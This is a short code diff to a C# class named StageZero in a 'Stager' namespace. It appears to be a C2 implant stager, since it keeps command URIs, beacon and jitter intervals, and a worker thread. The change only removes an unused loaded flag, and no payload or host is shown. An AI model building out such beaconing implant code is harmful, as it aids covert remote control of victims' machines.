@@ -17,7 +17,6 @@ namespace Stager
     class StageZero : IStageZero
     {
         List<Uri> commandUriList;
-        bool uriIsLoaded = false;
         int beacon, jitter;
         Thread mainThread;
         /// <summary>
@@ -29,8 +28,7 @@ namespace Stager
             commandUriList = new List<Uri>();
             if (uriFile.Exists)
             {
-                if (LoadUriList(uriFile) > 0)
-                    uriIsLoaded = true;
+                LoadUriList(uriFile);
                 this.beacon = beacon;
                 this.jitter = jitter;
                 System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12 | System.Net.SecurityProtocolType.Tls11;
